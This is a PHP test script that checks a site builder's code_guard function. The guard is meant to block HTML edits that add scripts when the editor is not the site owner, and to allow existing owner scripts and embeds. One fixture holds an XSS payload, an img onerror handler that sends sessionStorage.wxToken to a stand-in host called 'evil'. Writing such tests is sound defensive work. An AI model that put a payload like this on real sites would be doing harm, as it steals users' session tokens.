<?php
function grab($file,$name){ $s=file_get_contents($file); $i=strpos($s,"function $name("); $d=0;$st=false; for($j=$i;$j<strlen($s);$j++){ if($s[$j]=='{'){$d++;$st=true;} if($s[$j]=='}'){$d--; if($st&&$d==0) return substr($s,$i,$j-$i+1);} } }
define('ROOT_DIR','/s'); @mkdir('/s/a',0777,true); file_put_contents('/s/index.html','<html><body><script>window.wxSiteInit()</script><iframe src="https://www.google.com/maps/embed?x"></iframe></body></html>');
function list_pages(){ return [['path'=>'index.html']]; } function admin_installed(){ return true; } function act($a,$b){} function fail($m){ throw new Exception($m); }
eval(grab('/api/builder.php','code_tokens')); eval(grab('/api/builder.php','code_guard'));
$P=0;$F=0; function ck($ok,$m){global $P,$F; if($ok)$P++; else {$F++; echo "FAIL: $m\n";}}
function tryg($role,$html,$base){ $GLOBALS['WX_AUTH_ROLE']=$role; try{ code_guard($html,$base); return 'ok'; }catch(Exception $e){ return 'blocked'; } }
$page='<html><body><h1>About</h1></body></html>'; $evil='<html><body><h1>About</h1><img src=x onerror="fetch(\'//evil/\'+sessionStorage.wxToken)"></body></html>';
ck(tryg('editor',$evil,$page)==='blocked','editor added XSS');
ck(tryg('admin',$evil,$page)==='blocked','admin added XSS');
ck(tryg('sales',$evil,$page)==='blocked','sales added XSS');
ck(tryg('',$evil,$page)==='blocked','no role added XSS');
ck(tryg('owner',$evil,$page)==='ok','owner blocked from own scripts');
ck(tryg('editor',str_replace('About','About us',$evil),$evil)==='ok','editor cannot edit text on page that already has owner script');
ck(tryg('editor','<html><body><h1>New</h1><iframe src="https://www.google.com/maps/embed?x"></iframe></body></html>','')==='ok','editor cannot reuse site map embed');
ck(tryg('editor','<html><body><script>window.wxSiteInit()</script></body></html>','')==='ok','editor cannot reuse existing site script');
ck(tryg('editor','<html><body><script>window.wxSiteInit();steal()</script></body></html>','')==='blocked','editor modified script accepted');
echo "T8 pass=$P fail=$F\n";
